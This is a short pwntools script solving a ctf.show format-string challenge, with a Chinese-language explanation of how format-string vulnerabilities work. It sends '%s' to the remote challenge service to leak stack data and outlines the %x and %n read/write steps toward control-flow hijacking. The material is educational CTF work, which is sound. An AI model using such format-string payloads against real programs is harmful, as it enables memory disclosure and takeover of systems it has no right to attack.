from pwn import *
from LibcSearcher import *

#context(arch = "amd64",os = 'linux',log_level = 'debug')
context(arch = "i386", os = 'linux', log_level = 'debug')

#io = process("./pwn")
io = remote('pwn.challenge.ctf.show', 28212)
elf = ELF("./pwn")
libc = ELF('./libc.so.6')

# 等待提示信息，然后发送格式化字符串
io.recvuntil('Enter your format string: ')
# 发送%s格式化字符串，用于读取栈上的数据
io.sendline('%s')

io.interactive()

"""
【知识点讲解】
1. 题目类型：fmtstr - 格式化字符串漏洞
2. 核心原理：
   - 利用格式化字符串漏洞可以读取栈上的数据
   - %s格式化符会尝试将栈上的地址作为字符串读取
3. 执行流程：
   - 等待程序提示输入格式化字符串
   - 发送%s作为格式化字符串
   - 程序会将栈上的地址作为字符串读取并输出
4. 格式化字符串漏洞基础：
   - %s：读取字符串
   - %x：以十六进制形式读取数据
   - %n：将已输出的字符数写入指定地址
5. 常见利用步骤：
   - 确定格式化字符串的偏移量
   - 构造payload进行内存读取或写入
   - 实现信息泄露或控制流劫持
"""
